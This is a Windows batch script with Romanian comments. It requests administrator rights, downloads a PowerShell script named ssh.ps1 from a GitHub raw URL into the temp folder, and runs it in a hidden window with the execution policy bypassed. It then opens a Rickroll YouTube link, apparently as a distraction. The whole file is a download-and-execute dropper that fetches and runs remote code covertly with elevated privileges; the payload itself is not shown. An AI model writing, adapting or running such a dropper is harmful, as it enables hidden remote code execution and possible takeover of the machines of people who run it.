@echo off
setlocal EnableDelayedExpansion

:: Verifică dacă are privilegii de administrator
>nul 2>&1 net session
if %errorlevel% neq 0 (
    echo [!] Scriptul nu are permisiuni de administrator. Se cere permisiunea...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

echo [*] Rulează cu privilegii de administrator...

:: URL-ul brut către scriptul .ps1
set "url=https://raw.githubusercontent.com/Voltex-XD/batchfile/main/script2/ssh.ps1"

:: Folder temporar pentru descărcare
set "tmpfile=%TEMP%\ssh.ps1"

echo [*] Se descarcă scriptul PowerShell de pe GitHub...
powershell -Command "Invoke-WebRequest '%url%' -OutFile '%tmpfile%'"

if exist "%tmpfile%" (
    echo [*] Script descărcat. Se execută în background...
    powershell -WindowStyle Hidden -Command "Start-Process -WindowStyle Hidden -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File \"%tmpfile%\"'"

    :: Deschide link-ul pe YouTube
    start https://www.youtube.com/watch?v=dQw4w9WgXcQ
) else (
    echo [!] Eroare la descărcarea scriptului.
)

exit /b
